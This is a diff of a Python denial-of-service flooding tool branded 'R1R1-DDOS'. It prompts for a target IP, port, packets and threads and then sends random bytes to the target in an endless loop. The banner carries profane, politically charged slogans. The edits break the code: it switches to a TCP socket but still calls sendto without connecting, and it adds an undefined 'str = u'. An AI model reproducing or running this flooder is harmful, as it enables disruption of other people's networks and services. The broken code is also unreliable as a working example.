@@ -13,8 +13,8 @@ month = now.month
 year = now.year
 
 ##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+bytes = random._urandom(999)
 #############
 
 os.system("clear")
@@ -30,16 +30,16 @@ print("\033[95m||       ±±   ±±         ±±   ±±         ±± ±± ±±  
 print("\033[95m||       ±±     ±±       ±±     ±±                     ±±            ||\033[0m")
 print("\033[95m||       ±±       ±±     ±±       ±±                ±± ±± ±±         ||\033[0m")
 print("\033[97m||                                                                   ||\033[0m")     
-print("\033[97m||      Author  :  Z4CX-DDOS                                         ||\033[0m")
-print("\033[32m||      Github  :  https://github.com/Z4CX-DDOS                      ||\033[0m")
-print("\033[96m||                 Fucking genocide                                  ||\033[0m")
+print("\033[95m||      Author  :  R1R1-DDOS                                         ||\033[0m")
+print("\033[96m||      Github  :  https://github.com/Z4CX-DDOS                      ||\033[0m")
+print("\033[94m||                 Fucking genocide                                  ||\033[0m")
 print("\033[33m||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_||\033[0m")         
 ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
 port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
 packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
 thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
 time.sleep(5),
-print("\033[96m[\033[31m+\033[96m] -------⟩⟩ DON'T \033[0m "),
+print("\033[96m[\033[31m+\033[96m]       DON'T \033[0m "),
 time.sleep(5),
 print("\033[92m[\033[31m+\033[92m] -------------⟩⟩ STOP \033[0m "),
 time.sleep(5),
@@ -50,6 +50,7 @@ time.sleep(5),
 print("\033[95m[\033[31m+\033[95m] -------------------------⟩⟩  FREE PALESTINE \033[0m ")
 
 sent = 0
+str = u
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
